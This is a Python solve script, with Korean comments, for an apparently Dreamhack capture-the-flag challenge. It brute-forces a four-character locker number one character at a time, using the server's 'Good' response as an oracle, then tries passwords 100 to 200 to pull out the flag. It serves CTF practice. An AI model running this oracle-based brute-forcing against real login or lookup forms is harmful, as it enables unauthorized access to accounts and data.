import requests
import string

def solve_random_test():
    # 서버 URL (문제 환경에 맞게 수정해주세요)
    url = "http://host3.dreamhack.games:9221/"
    
    print(f"[DEBUG] ================= 시작 =================")
    print(f"[DEBUG] 접속 URL: {url}")
    
    # 사물함 번호에 사용되는 문자 세트 (소문자 + 숫자)[cite: 20]
    charset = string.ascii_lowercase + string.digits
    locker_num = ""
    
    print("\n[DEBUG] 1. 사물함 번호 추출 시작 (Blind Brute-force)")
    # 사물함 번호의 길이는 4입니다[cite: 20].
    for position in range(1, 5):
        for char in charset:
            # 현재까지 찾은 문자열에 다음 글자를 덧붙여서 시도
            attempt_str = locker_num + char
            
            data = {
                "locker_num": attempt_str,
                "password": "" # 비밀번호는 아직 모르므로 빈 값[cite: 20]
            }
            
            response = requests.post(url, data=data)
            
            # 서버가 "Good" 문자열을 반환하면 해당 글자가 맞다는 의미[cite: 20]
            if "Good" in response.text:
                locker_num += char
                print(f"[DEBUG] -> 발견! 현재까지 번호: {locker_num}")
                break
                
    if len(locker_num) != 4:
        print("[ERROR] 사물함 번호를 온전히 찾지 못했습니다. 서버 상태를 확인해주세요.")
        return
        
    print(f"\n[DEBUG] 사물함 번호 확정: {locker_num}")
    print("\n[DEBUG] 2. 자물쇠 비밀번호 추출 시작 (100 ~ 200)")
    
    flag = ""
    # 비밀번호는 100 이상 200 이하의 정수입니다[cite: 20].
    for password in range(100, 201):
        data = {
            "locker_num": locker_num,
            "password": str(password)
        }
        
        response = requests.post(url, data=data)
        
        # 비밀번호까지 모두 맞았다면 결과에 "FLAG:" 문자열이 포함됩니다[cite: 20].
        if "FLAG:" in response.text:
            print(f"[DEBUG] -> 정답 비밀번호 발견!: {password}")
            
            # 응답 HTML 텍스트에서 <pre> 태그 안의 FLAG 부분을 깔끔하게 추출
            # 예: <pre>FLAG:DH{...}</pre>
            start_idx = response.text.find("FLAG:DH{")
            if start_idx != -1:
                end_idx = response.text.find("}</pre>", start_idx)
                flag = response.text[start_idx + 5 : end_idx + 1] # "FLAG:" 부분(5글자) 제거
            break
            
    print(f"\n[DEBUG] ================= 최종 결과 =================")
    if flag:
        print(f"[FLAG] {flag}")
    else:
        print("[FAIL] 플래그를 찾지 못했습니다.")

if __name__ == "__main__":
    solve_random_test()